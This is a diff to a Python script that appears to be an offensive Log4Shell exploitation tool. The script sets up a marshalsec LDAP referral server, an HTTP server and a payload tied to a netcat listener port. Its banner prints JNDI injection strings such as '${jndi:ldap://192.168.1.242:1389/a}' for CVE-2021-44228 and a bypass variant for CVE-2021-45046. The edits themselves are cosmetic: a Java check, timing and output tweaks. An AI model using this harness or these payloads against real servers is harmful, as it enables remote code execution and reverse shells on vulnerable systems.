@@ -1,4 +1,4 @@
-import argparse, subprocess, time, threading
+import argparse, os, subprocess, time, threading
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from pathlib import Path
 from termcolor import cprint
@@ -10,8 +10,10 @@ JAVA_CLASS = 'marshalsec.jndi.LDAPRefServer'
 
 ### Check if Java SE Development Kit is installed 
 def check_java() -> bool:
-  exit_code = subprocess.call([JAVA_INTERPRETER, '-version', ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-  return exit_code == 0
+  if os.path.isfile(JAVA_INTERPRETER):
+    exit_code = subprocess.call([JAVA_INTERPRETER, '-version', ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    return exit_code == 0
+  return 0
 
 ### Generate PAYLOAD
 def generate_payload(ip: str, nc_port: int) -> None:
@@ -81,30 +83,31 @@ def main() -> None:
   cprint('[•] + Active  Callback Module aka ACM', 'green')
   cprint('[•] + Active  Scanner  Module aka ASM', 'green')
   print('')
+  time.sleep(1)
   cprint('[*] ACM - Active Callback Module - Intels', 'green', attrs=['bold'])
   cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://192.168.1.242:1389/a}', 'green')
   cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#192.168.1.242:1389/a}', 'green')
-  time.sleep(1)
   print('')
+  time.sleep(1)
   cprint('[+] ACM - Active Callback Module - Settings', 'yellow', attrs=['bold'])
   cprint(f'[+] IP            {_ip}', 'yellow')
   cprint(f'[+] HTTP_port     {_http_port}', 'yellow')
   cprint(f'[+] LDAP_port     {_ldap_port}', 'yellow')
   cprint(f'[+] NC_port       {_nc_port}', 'yellow')
-  time.sleep(2)
   print('')
+  time.sleep(1)
   cprint('[!] ACM - Active Callback Module - Starting', 'cyan', attrs=['bold'])
-  time.sleep(2)
+  time.sleep(1)
 
   try:
     if not check_java():
-      print(Fore.RED + '[-] Java SE Development Kit is not installed: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html')
+      cprint('[-] FATAL: JDK is not installed (https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)', 'red')
       raise SystemExit(1)
     generate_payload(_ip, int(_nc_port))
     time.sleep(1)
     start_services(_ip, int(_ldap_port), int(_http_port))
   except KeyboardInterrupt:
-    print(Fore.RED + "user interuption")
+    cprint('user interuption', 'red')
     raise SystemExit(0)
 
 if __name__ == "__main__":
